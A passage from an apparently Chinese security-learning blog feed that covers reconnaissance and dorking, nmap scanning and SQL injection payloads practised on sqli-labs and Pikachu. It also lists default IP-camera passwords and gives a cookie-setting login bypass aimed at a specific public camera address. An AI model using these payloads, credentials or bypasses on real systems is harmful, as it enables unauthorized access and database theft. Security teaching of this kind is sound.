nslookup（非权威解答）</h4><p>  testfire.net</p><p>​    <img src="/2021/09/18/Web%E6%B8%97%E9%80%8F/9.png"></p><p>  得到testfire.net的IP地址65.61.137.117</p><h4 id="—-dig"><a href="#—-dig" class="headerlink" title="— dig"></a>— dig</h4><p>  命令： dig testfire.net</p><p>​    <img src="/2021/09/18/Web%E6%B8%97%E9%80%8F/10.png" alt="image-20211004193118342" style="zoom: 80%;"></p><p>命令：  dig  +trace  testfire.net          —获取域名的详细解析过程   <img src="/2021/09/18/Web%E6%B8%97%E9%80%8F/11.png"></p><p>命令：  dig   @8.8.8.8  testfire.net        —“@指定一个dns服务器解析”</p> <img src="/2021/09/18/Web%E6%B8%97%E9%80%8F/12.png" alt="image-20211006111757070" style="zoom:67%;"><h4 id="—dnsenum"><a href="#—dnsenum" class="headerlink" title="—dnsenum"></a>—dnsenum</h4><p>此款工具在解析域名的时候会自动检测域传送漏洞</p><img src="/2021/09/18/Web%E6%B8%97%E9%80%8F/13.png" alt="image-20211006145810233" style="zoom:67%;"><h4 id="—-利用站长工具"><a href="#—-利用站长工具" class="headerlink" title="— 利用站长工具"></a>— 利用站长工具</h4><p>​     路由追踪</p><h4 id="—CDN加速"><a href="#—CDN加速" class="headerlink" title="—CDN加速"></a>—CDN加速</h4><p>　CDN即内容分发网络，构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥堵，提高用户访问响应速度和命中率。</p><p> 　<strong>CDN加速本意是进行节点缓存，使网站访问速度加快。一般情况下是没办法得到目标网站的真实IP的</strong></p><h3 id="IP-查询"><a href="#IP-查询" class="headerlink" title="IP 查询"></a>IP 查询</h3><h4 id="—ip查询"><a href="#—ip查询" class="headerlink" title="—ip查询"></a>—ip查询</h4><p>​     工具：站长之家</p><h4 id="—同IP网站查询"><a href="#—同IP网站查询" class="headerlink" title="—同IP网站查询"></a>—同IP网站查询</h4><p>  同一个IP上的网站</p><p>　例如：　1.1.1.1</p><p>​                 A                  B</p><p>​           目标网站         旁站（和目标网站同服务器下的某一个网站）</p><p>  <strong>入侵目标网站时，发现没有漏洞，可以选择旁站入侵，从那里突破拿到旁站的webshell然后再突破权限拿到目标站</strong></p><p>​             C段：和目标服务器ip处在同一个C段的其他服务器</p><p>​          例如：目标网站 1.1.1.1，则它的C段是<code>1.1.1.1~1.1.1.255</code></p><h4 id="—IP2Location"><a href="#—IP2Location" class="headerlink" title="—IP2Location"></a>—IP2Location</h4><p>​     查询IP得到地址经纬度再定位到物理位置</p><p>​      <a href="https://www.maxmind.com/en/hom">https://www.maxmind.com/en/hom</a></p><p>​     查经纬度：gpsspg.com&#x2F;maps.htm</p><h3 id="利用搜索引擎搜索信息"><a href="#利用搜索引擎搜索信息" class="headerlink" title="利用搜索引擎搜索信息"></a>利用搜索引擎搜索信息</h3><h4 id="—-google-hacking-用谷歌引擎语法"><a href="#—-google-hacking-用谷歌引擎语法" class="headerlink" title="— google hacking(用谷歌引擎语法)"></a>— google hacking(用谷歌引擎语法)</h4><p>google机器人，爬行全世界所有网站的内容。google hacker就是利用搜索引擎语法，获取有关网站的信息。谷歌用不了，可以使用其他搜索引擎</p><p> site     指定网站</p><p>“”          包含关键字</p><p>filetype    指定文件类型</p><p>  @搜索网站目录结构</p><p>​     intex:to parent directory site:testfire.net(目标网站存在IIS配置存在缺陷，即可随意浏览站点文件夹)</p><img src="/2021/09/18/Web%E6%B8%97%E9%80%8F/21.png" alt="image-20220812180706887" style="zoom: 67%;"><img src="/2021/09/18/Web%E6%B8%97%E9%80%8F/15.png" alt="image-20211008160721733" style="zoom: 50%;"><p>   @ 搜索容易存在SQL注入的页面</p><p>​      inurl:php?id&#x3D;、inurl:asp?id、inurl:Show.asp?ID&#x3D;</p><p>   @搜索phpinfo()</p><p>​      intext:”PHP Version “ ext:php intext :”disabled” intext:”Build Date” intext :”System” intext:”allow_url_fopen” </p><p>​    @搜索phpstudy</p><p>​       intitle:”php中文网  探针2014”</p><h4 id="—钟馗之眼"><a href="#—钟馗之眼" class="headerlink" title="—钟馗之眼"></a>—钟馗之眼</h4><p>​     <a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a></p><p>​      ZoomEye支持公网设备指纹检索和Web指纹检索。网站指纹包括应用名、版本、前端框架、后端框架、服务端语言、服务器操作系统、网站容器、内容管理系统和数据等。</p><p>​     帮助手册：<a href="https://www.zoomeye.org/help">https://www.zoomeye.org/help</a></p><p>@搜索iis6.0组件</p><p>app:”Microsoft IIS httpd” ver:”6.0”</p><p>@搜索开启3389端口的windows主机</p><p>port:3389 OS:windows</p><h4 id="—shodan"><a href="#—shodan" class="headerlink" title="—shodan"></a>—shodan</h4><p><a href="https://www.shodan.io/">https://www.shodan.io/</a></p><p> —利用shodan搜索</p><p>​        JAWS&#x2F;1.1      ###公网摄像头</p><p> —空口令登入</p><p>​      使用口令【admin&#x2F;空】，即可进入后台，查看摄像头。</p><p> —登录绕过</p><p>  <a href="http://83.179.59.146:60001/view2.html">http://83.179.59.146:60001/view2.html</a></p><p>​    在控制台中输入以下JS代码，然后直接访问【&#x2F;view2.html】，即可绕过登录验证进入控制台</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">cookie</span>=<span class="string">&quot;dvr_camcnt=4&quot;</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">cookie</span>=<span class="string">&quot;dvr_usr=admin&quot;</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">cookie</span>=<span class="string">&quot;dvr_pwd=123&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="/2021/09/18/Web%E6%B8%97%E9%80%8F/17.png" alt="17"></p><p>​      —其他摄像机默认账密</p><p>​       @海康威视IP网络摄像机admin,密码12345</p><p>​              Hikvision</p><p>​              Server:DVRDVS-Webs</p><p>​       @大华网络摄像机 admin,密码888888</p><p>​       @天地伟业网络摄像机 Admin，密码：111111</p><h4 id="—网站信息收集"><a href="#—网站信息收集" class="headerlink" title="—网站信息收集"></a>—网站信息收集</h4><p>​      收集指纹信息</p><p>​      Web服务器信息</p><p>​        火狐插件：Netcraft Extension、Wappalyzer</p><h4 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h4><p>域传送漏洞：<a href="https://github.com/lijiejie/edu-dns-zone-transfer">https://github.com/lijiejie/edu-dns-zone-transfer</a></p><p>收集子域名的思路：<a href="https://www.secpulse.com/archives/53182.html">https://www.secpulse.com/archives/53182.html</a></p><p>Web信息收集：<a href="https://blog.csdn.net/redbu1l/article/details/78763738">https://blog.csdn.net/redbu1l/article/details/78763738</a></p><p>shodan语法：<a href="http://www.freebuf.com/sectool/121339.html">http://www.freebuf.com/sectool/121339.html</a></p><p>关于摄像头：<a href="http://0day5.com/archives/3766/">http://0day5.com/archives/3766/</a></p><p>GHDB:<a href="https://www.exploit-db.com/goohle-hackong-database/">https://www.exploit-db.com/goohle-hackong-database/</a></p><h2 id="扫描技术"><a href="#扫描技术" class="headerlink" title="扫描技术"></a>扫描技术</h2><h4 id="资产发现"><a href="#资产发现" class="headerlink" title="资产发现"></a>资产发现</h4><p>发现目标环境中有哪些资产，联网设备，主机，服务器，各种服务等。</p><p><strong>扫描神器：nmap</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap 127.0.0.1</span><br><span class="line">在没有指定端口的情况下，默认扫描top 1000端口</span><br></pre></td></tr></table></figure><p><img src="/2021/09/18/Web%E6%B8%97%E9%80%8F/18.png" alt="image-20211016163051916"></p><p>主机发现：有哪些主机在线，IP地址（不进行端口扫描）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">参数:-sP/-sn            不进行端口扫描   </span><br><span class="line">命令:nmap 网段/端口号 -sP</span><br><span class="line">ping扫描 </span><br></pre></td></tr></table></figure><p>端口扫描：开启的端口、端口上的服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">参数：-p       指定端口</span><br><span class="line">        -p 80</span><br><span class="line">        -p 1-80</span><br><span class="line">        -p 80,3389,22,21</span><br><span class="line">        -p 1-80,3389,8080</span><br><span class="line">        -p 1-65535</span><br><span class="line">        -p-     全端口扫描</span><br></pre></td></tr></table></figure><p> 扫描方式：</p><p>​       <strong>TCP   全链接扫描</strong></p><p>​       <code>-sT     TCP 全链接扫描</code></p><p>​         建立完整三次握手过程</p><p><img src="/2021/09/18/Web%E6%B8%97%E9%80%8F/19.png" alt="image-20211027151656561"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">第一次握手：主机A发送位码为[SYN]＝1，随机产生seq number=0的数据包到服务器，主机B由SYN=1知道，A要求建立联机；</span><br><span class="line">第二次握手：主机B收到请求后要确认联机信息，向A发送ack number=(主机A的seq+1)，SYN=1，ACK=1；</span><br><span class="line">第三次握手：主机A收到后检查ack number是否正确，即第一次发送的seq number+1，以及位码ack是否为1，若正确，主机A会再发送ack number=(主机B的seq+1)，ack=1，主机B收到后确认seq值与ack=1则连接建立成功。</span><br></pre></td></tr></table></figure><p>​       <strong>SYN   半连接扫描</strong></p><p>​    只进行一次确定（两次握手）</p><p><code>-sS    SYN半连接扫描</code></p><p>​       <strong>隐蔽扫描</strong>：Null扫描、Xmas扫描、FIN扫描</p><p>工具：wireshark</p><p>​       过滤条件：ip.addr&#x3D;&#x3D;xxx.xxx.xxx.xxx(ip地址) and tcp.port&#x3D;&#x3D;80</p>]]></content>
      
      
      <categories>
          
          <category> web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
            <tag> web渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web基础---SQL注入</title>
      <link href="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2021/08/14/SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="web基础—SQL注入"><a href="#web基础—SQL注入" class="headerlink" title="web基础—SQL注入"></a>web基础—SQL注入</h2><h3 id="What"><a href="#What" class="headerlink" title="What"></a><strong>What</strong></h3><p>​      SQL注入是服务器端未严格校验客户端发送的数据，而导致服务端SQL语句被恶意修改并成功执行的行为。</p><span id="more"></span><h3 id="Why"><a href="#Why" class="headerlink" title="Why"></a><strong>Why</strong></h3><ul><li>代码对带入SQL语句的参数过滤不严格</li><li>未启用框架的安全配置，未使用框架安全的查询方法</li><li>测试接口未删除</li><li>未启用防火墙或未使用其他的安全防护设备</li></ul><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a><strong>流程</strong></h3><ol><li><p>判断是否有sql注入漏洞</p><p>1）可控参数的改变能否影响页面显示结果</p><p>2）输入的SQL语句能否报错–通过数据库报错，看到数据库的一些语句痕迹   </p><p>3）输入的SQL语句能否不报错–能够成功闭合</p></li><li><p>判断操作系统，数据库，web应用类型</p></li><li><p>获取数据库信息（数据库—表—字段—值 ），包括管理员信息及拖库</p></li><li><p>加密信息破解，sqlmap可自动破解</p></li><li><p>提升权限，获得sql-shell,os-shell,登录应用后台</p></li></ol><h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><p> 攻击者利用SQL注入漏洞，可以获取数据库的多种信息（管理员的后台密码），从而获取数据库中的内容（脱库）。再特别情况下还可以修改数据库内容或者插入内容到数据库，如果数据库权限分配存在问题，或者数据库本身存在缺陷，攻击者可以通过SQL注入漏洞直接获取webshell或者服务器系统权限（mof或udf提权）。</p><p><strong>基础SQL语句及MySQL数据库知识</strong></p><p><strong>sql语句：</strong></p><blockquote><p>order by 4<br>判断有多少列<br>union select 1,2,3<br>判断数据显示点<br>union select 1,user(),database()­­<br>­显示出登录用户和数据库名<br>union select 1,(select group_concat(table_name) from information_schema.tables where table_schema &#x3D; ‘security’ ),3<br>查看数据库有哪些表<br>union select 1,(select group_concat(column_name) from information_schema.columns where table_schema &#x3D; ‘security’ and table_name&#x3D;’users’ ),3<br>查看对应表有哪些列<br>union select 1,(select group_concat(concat_ws(0x7e,username,password))from users),3<br>查看账号密码信息</p><p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/1.png"></p><p>MySQL常用函数与参数：</p><p>@  &#x3D;、&gt;、&gt;&#x3D;、&lt;&#x3D;、&lt;&gt;(不等于)         比较运算符</p><p>@  and、or                                              逻辑运算符</p><p>@  database()                                          当前数据库名</p><p>@  length()                                               返回字符串的长度</p><p>@  substring()                                          截取字符串的长度</p><p>@  substr()                                                substr(截取的字符串，截取的起始位置，截取长度)                       </p><p>@  left()                                                      从左侧开始取指定字符个数的字符串</p><p>@  concat()                                                没有分隔符的连接字符串</p><p>@  concat_ws()                                          含有分隔符的连接字符串</p><p>@  group_concat()                                     连接一个组的字符串</p><p>@  ascii()                                                      返回ASCII码</p></blockquote><p><strong>Mysql数据库：</strong></p><p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/2.png" alt="2"></p><p>对于mysql数据库（版本大于5.0）而言，mysql中存在一个Information_Schema数据库，这是mysql自带的数据库，它用来访问mysql数据库元数据（数据库名、表名、列名、数据类型，访问权限等）。</p><blockquote><p>其中， Information_Schema数据库中有三张表值得我们重点关注：</p><p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/3.png" alt="3"></p><p>库名表：</p><p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/4.png" alt="4"></p><p>表名表：</p><p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/5.png" alt="5"></p><p>字段名表：</p><p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/6.png"></p></blockquote><p><strong>名称：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">information_schema.schemata    //总的数据库</span><br><span class="line">information_schema.schema      //数据库的库</span><br><span class="line">information_schema.tables      //数据表的库</span><br><span class="line">information_schema.columns     //数据结构的库</span><br><span class="line">table_schema                   //数据库</span><br><span class="line">table_name                     //数据表</span><br><span class="line">column_name                    //数据结构</span><br></pre></td></tr></table></figure><h3 id="Classify"><a href="#Classify" class="headerlink" title="Classify"></a><strong>Classify</strong></h3><p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/7.png" alt="7"></p><h5 id="GET型注入与POST型注入的区别："><a href="#GET型注入与POST型注入的区别：" class="headerlink" title="GET型注入与POST型注入的区别："></a>GET型注入与POST型注入的区别：</h5><table><thead><tr><th>请求方式</th><th>GET型注入</th><th>POST型注入</th></tr></thead><tbody><tr><td>url可见性</td><td>参数url可见</td><td>url参数不可见</td></tr><tr><td>数据传输上</td><td>通过拼接url进行传递参数</td><td>通过body体传输参数</td></tr><tr><td>安全性</td><td>比POST更不安全</td><td></td></tr><tr><td>缓存性</td><td>请求可以缓存</td><td>请求不可以缓存</td></tr><tr><td>后退页面</td><td>请求页面后退时，不产生影响（只请求一次）</td><td>会再次提交请求（请求两次，即burpsuite里点两次forward,网页显示结果）</td></tr><tr><td>传输数据的大小</td><td>一般不超过2k-4k</td><td>根据php.ini配置文件设定，也可以无限大</td></tr><tr><td>数据类型</td><td>只接受ASCII字符</td><td>没有限制</td></tr></tbody></table><h4 id="回显型注入"><a href="#回显型注入" class="headerlink" title="回显型注入"></a>回显型注入</h4><h5 id="基于整型注入："><a href="#基于整型注入：" class="headerlink" title="基于整型注入："></a>基于整型注入：</h5><p>当输入的参数为整形时，如果存在注入漏洞，可以认为是数字型注入。</p><p>测试步骤：</p><p>（1） 加单引号，URL：<a href="http://127.0.0.1/sqli-labs-master/Less-2/?id=1&#39;">http://127.0.0.1/sqli-labs-master/Less-2/?id=1&#39;</a></p><p>对应的sql：select * from table where id&#x3D;1’ 这时sql语句出错，程序无法正常从数据库中查询出数据，就会抛出异常；</p><p>（2） 加and 1&#x3D;1 ,URL：<a href="http://127.0.0.1/sqli-labs-master/Less-2/?id=1and">http://127.0.0.1/sqli-labs-master/Less-2/?id=1and</a> 1&#x3D;1</p><p>对应的sql：select * from table where id&#x3D;1 and 1&#x3D;1 语句执行正常，与原始页面如任何差异；</p><p>（3） 加and 1&#x3D;2，URL：<a href="http://127.0.0.1/sqli-labs-master/Less-2/?id=1and">http://127.0.0.1/sqli-labs-master/Less-2/?id=1and</a> 1&#x3D;2</p><p>对应的sql：select * from table where id&#x3D;1 and 1&#x3D;2 语句可以正常执行，但是无法查询出结果，所以返回数据与原始网页存在差异</p><p>如果满足以上三点，则可以判断该URL存在数字型注入。</p><p><strong>实验（sqli-labs&#x2F;less-2):</strong></p><blockquote><p>URL:<a href="http://127.0.0.1/sqli-labs-master/Less-2/?id=1">http://127.0.0.1/sqli-labs-master/Less-2/?id=1</a></p></blockquote><p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/8.png"></p><p><strong>测试步骤：</strong></p><ul><li>加单引号：</li></ul><blockquote><p>URL：<a href="http://127.0.0.1/sqli-labs-master/Less-2/?id=1%E2%80%99">http://127.0.0.1/sqli-labs-master/Less-2/?id=1’</a></p><p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/9.png">由报错可以猜测此时的后台数据库SQL语句：</p><p>select …from…where id&#x3D;1’ ；</p></blockquote><blockquote><ul><li>加and 1&#x3D;1 ,URL：<a href="http://127.0.0.1/sqli-labs-master/Less-2/?id=1and">http://127.0.0.1/sqli-labs-master/Less-2/?id=1and</a> 1&#x3D;1</li></ul><p>​       对应的sql：select * from table where id&#x3D;1 and 1&#x3D;1 语句执行正常，与原始页面如任何差异；</p><ul><li>加and 1&#x3D;2，URL：<a href="http://127.0.0.1/sqli-labs-master/Less-2/?id=1and">http://127.0.0.1/sqli-labs-master/Less-2/?id=1and</a> 1&#x3D;2</li></ul><p>​        对应的sql：select * from table where id&#x3D;1 and 1&#x3D;2 语句可以正常执行，但是无法查询出结果，所以返回数据与原始网页存在差异</p><p>存在整型注入。</p><p>获取一些数据库信息：</p><p>先判断字段数：用order by或者union select…</p><p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/10.png" alt="10"></p><p>接着数据库：</p><p>当前数据库</p><p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/11.png" alt="11"></p><p>枚举数据库</p></blockquote><blockquote><p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/12.png" alt="12"></p><p>枚举表</p><p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/13.png"></p><p>枚举”users‘表的字段</p><p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/14.png"></p><p>枚举users字段username与password的值</p><p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/15.png"></p></blockquote><h5 id="基于字符型注入："><a href="#基于字符型注入：" class="headerlink" title="基于字符型注入："></a>基于字符型注入：</h5><p>当输入的参数为字符串时，称为字符型。字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的。</p><p>例如数字型语句：select * from table where id &#x3D;3</p><p>则字符型如下：select * from table where name&#x3D;’admin’</p><p>字符型注入有单引号，双引号，括号。此处为单引号举例，其他类似</p><p><strong>测试步骤：</strong></p><ul><li>加单引号：</li></ul><blockquote><p>select * from … where name&#x3D;’admin’ ‘;</p><p>三个单引号，无法正常执行，会报错</p></blockquote><p>加 ‘ and 1&#x3D;1</p><blockquote><p>select * from… where name&#x3D;’admin’ and 1&#x3D;1’;</p><p>以上语句也无法正常执行，需要注释符将后面的单引号注释掉</p></blockquote><p>加 ‘ and 1&#x3D;1#</p><blockquote><p>select * from… where name&#x3D;’admin’ and 1&#x3D;1#’;</p><p>正常执行</p></blockquote><p>加 ‘ and 1&#x3D;2#</p><blockquote><p>select * from… where name&#x3D;’admin’ and 1&#x3D;2#’;</p><p>and后面的1&#x3D;2为假，会报错</p></blockquote><p>因此存在字符型注入</p><p><strong>实验（sqli-labs&#x2F;less-1）：</strong></p><blockquote><p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/16.png"></p><p>可猜测为字符型注入</p><p>然后按照上面的测试步骤进行进一步验证</p><ul><li>加 ‘ and 1&#x3D;1</li></ul><p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/17.png"></p><ul><li>加 ‘ and 1&#x3D;1#</li></ul><p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/18.png"></p><ul><li>加 ‘ and 1&#x3D;2#</li></ul><p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/19.png"></p></blockquote><p>获取相关数据库信息同整型注入语法</p><h5 id="基于搜索型注入："><a href="#基于搜索型注入：" class="headerlink" title="基于搜索型注入："></a>基于搜索型注入：</h5><p>1）简介<br>一些网站为了方便用户查找网站的资源,都对用户提供了搜索的功能,因为是搜索功能,往往是程序员在编写代码时都忽略了对其变量(参数)的过滤,而且这样的漏洞在国内的系统中普遍的存在:</p><p>其中又分为POST&#x2F;GET,GET型的一般是用在网站上的搜索,而POST则用在用户名的登录,可以从form表单的method&#x3D;”get”属性来区分是get还是post。搜索型注入又称为文本框注入。</p><p>2）原理</p><blockquote><p><strong>$sql&#x3D;”select * from user where password like ‘%$pwd%’ order by password”;</strong><br>“%”匹配任何字符，“like”的意思就是像。<br>这句SQL的语句就是基于用户输入的pwd在users表中找到相应的password，正常用户当然会输入例如admin,ckse等等。<br>但是当有人输入这样的内容的时候：**’and 1&#x3D;1 and ‘%’&#x3D;’**</p><p>这样的话这句SQL语句就变成这样：</p><p><strong>select * from user where password like ‘%fendo’ and 1&#x3D;1 and ‘%’&#x3D;’%’ order by password</strong></p><p>可判断存在SQL注入</p></blockquote><p><strong>实验（Pikachu）：</strong></p><p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/20.png"></p><blockquote><p>先输入单引号 ’ ，报错</p><p>You have an error in your SQL syntax; check the manual that corresponds  to your MySQL server version for the right syntax to use near ‘%’’ at  line 1</p><p>一个单引号没有闭合，报错</p><p>接着输入 <strong>‘and 1&#x3D;1 and ‘%’&#x3D;’</strong>(或者 <strong>‘ and 1&#x3D;1#</strong>)</p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/21.png" alt="image-20210722164029906" style="zoom:80%;"></blockquote><p>获取数据库信息同整型注入语法</p><h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><h5 id="基于错误型盲注"><a href="#基于错误型盲注" class="headerlink" title="基于错误型盲注"></a>基于错误型盲注</h5><p>报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。这里主要记录一下<code>xpath语法错误</code>和<code>concat+rand()+group_by()导致主键重复</code></p><p><strong>XPath语法：</strong></p><p>利用xpath语法错误来进行报错注入主要利用<code>extractvalue</code>和<code>updatexml</code>两个函数。</p><p><code>extractvalue():从目标XML中返回包含所查询值的字符串</code></p><blockquote><p>EXTRACTVALUE （XML_document,XPath_string);</p><p>第一个参数：XML_document是String格式，为XML文档对象的名称</p><p>第二个参数：XPath_string(XPath格式的字符串)<code>要求符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里，因此可以利用。</code></p><p>concat:返回结果为连接参数产生的字符串。</p><p>payload:<code>id=&#39; and (select extractvalue(&quot;anything&quot;,concat(&#39;~&#39;,(select语句))))</code></p><p>针对数据库：</p><p>查询数据库名：<code>id=&#39; and (select extractvalue(1,concat(&#39;~&#39;,(select database()))))</code>;</p><p>爆表：<code>id=&#39; and (select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))</code>;</p><p>爆字段：<code>id=&#39; and (select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;...&#39;))))</code>;</p><p>爆值：<code>id=&#39; and (select extractvalue(1,concat(&#39;~&#39;,(select group_concat(concat_ws(&#39;:&#39;,username,password))from &quot;COLUMN_NAME&quot;))))</code>;</p></blockquote><p><code>updatexml():更新XML</code></p><blockquote><p>UPDATEXML（XML_document,XPath_string,new_value）;</p><p>第一个参数：xml_document是string格式，为xml文档对象的名称 </p><p>第二个参数：xpath_string是xpath格式的字符串</p><p>第三个参数：new_value是string格式，替换查找到的负荷条件的数据 作用：改变文档中符合条件的节点的值</p><p>payload:<code>id=&#39;and (select updatexml(&quot;anything&quot;,concat(&#39;~&#39;,(select语句)),&quot;anything&quot;))</code></p><p>针对数据库：</p><p>查询数据库名：<code>id=&#39; and (select updatexml(1,concat(&#39;~&#39;,(select database())),‘~’))</code>;</p><p>爆表：<code>id=&#39; and (select updatexml(1,concat(&#39;~&#39;,(select table_name from information_schema.tables where table_schema=database())),&#39;~&#39;))</code>;</p><p>爆字段：<code>id=&#39; and (select updatexml(1,concat(&#39;~&#39;,(select column_name from informtion_schema.columns where table_schema=database() and table_name=&quot;TABLE_NAME&quot;)),&#39;~&#39;))</code>;</p><p>爆值：<code>id=&#39; and (select updatexml(1,concat(&#39;~&#39;,(select group_concat(concat_ws(&#39;:&#39;,username,password))from &quot;COLUMN_NAME&quot;))))</code></p></blockquote><p><strong>实验（sqli-labs&#x2F;less11)：</strong></p><p>用Burp suite抓包</p><p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/22.png"></p><p>发送到Repeater,用extractvalue()来报错：</p><p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/23.png"></p><p><strong>concat+rand()+group_by()导致主键重复</strong></p><p>这种报错方法的本质是因为floor(rand(0)*2)的重复性，导致group by语句出错group by key的原理是循环读取数据的每一行，将解雇保存于临时表。</p><p><code>rand():生成0~1之间的随机数，可以给定一个随机数的种子，对于每一个给定的种子，rand()函数都会产生一系列可以复现的数字</code></p><p><code>floor()：对任意正或者负的十进制值向下取整</code></p><p>通常用这两个函数的方法是floor(rand(0))*2,其会生成0和1两个数</p><p><code>group by是根据一个或多个列对结果集进行分组的sql语句</code></p><p>常见的payload:</p><p><code>&#39;union select 1 from (select count(*),concat((select语句),floor(rand(0)*2))x from &quot;一个足够大的表&quot; group by x)a#</code></p><blockquote><p>针对数据库</p><p>爆数据库名：<code>&#39; union select 1 from (select count(*),concat((select database()),&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a#</code></p><p>爆表：<code>&#39; union select 1 from(select count(*),concat((select table_name from information_schema.tables where table_schema=database()limit 0,1),&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a#</code></p><p>爆字段：<code>&#39; union select 1 from (select count(*),concat((select column_name from information_schema.columns where table_schema=database() and table_name=&quot;TABLE_NAME&quot; limit 0,1),&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a#</code></p><p>*** 不能使用group_concat()函数，所以用limit语句来限制查询结果的列数</p></blockquote><h5 id="基于布尔型盲注"><a href="#基于布尔型盲注" class="headerlink" title="基于布尔型盲注"></a>基于布尔型盲注</h5><p>布尔盲注：True与Fales，它只会根据你的注入信息返回True跟False，没有之前的报错信息。</p><p>常用函数：</p><blockquote><p>length()函数：返回字符串的长度</p><p>substr()：截取字符串（语法：substr(str,pos,len);）pos–位置，len–长度</p><p>left():夹逼法（语法：left(str,pos);)   pos–位置</p><p>ascii()：返回字符的ascii码，将字符变成数字</p></blockquote><p>因为盲注不能直接用database()函数得到数据库名，先要判断数据库名的长度为多少；</p><p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/24.png"></p><p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/25.png"></p><p>由上面两个页面显示可以推测数据库名的长度为8.</p><p><strong>一、下面来猜测这些字符串(都需要慢慢试试）</strong>：</p><p>方法一：</p><blockquote><p>夹逼法：</p><p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/26.png"></p><p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/27.png"></p><p>由此可推测数据库名第一个字符为“s”;</p></blockquote><p>方法二：</p><blockquote><p>直接用substr()函数将每个字符带入验证（比较麻烦）</p><p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/28.png"></p><p>不断测试，得到 ‘s’ 为第一个字符；</p></blockquote><p>方法三：(转化为数字型夹逼法)</p><blockquote><p>用ascii()函数和substr()函数</p><p>payload: <code>and ascii(substr(database(),1,1))&gt;106</code></p><p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/29.png"></p><p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/30.png"></p></blockquote><p>一个一个试出数据库名</p><p>方法四：</p><blockquote><p>用ascii()函数和substr()函数、Burp suite抓包,<strong>一个一个字符爆破</strong></p><p>将抓到的包发送到Intruder模块（爆破模块）</p><p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/31.png"></p><p>得到下图：</p><p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/32.png"></p><p>设置暴力破解类型</p><p><img src="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/58.png"></p><p>start attack</p><p><img 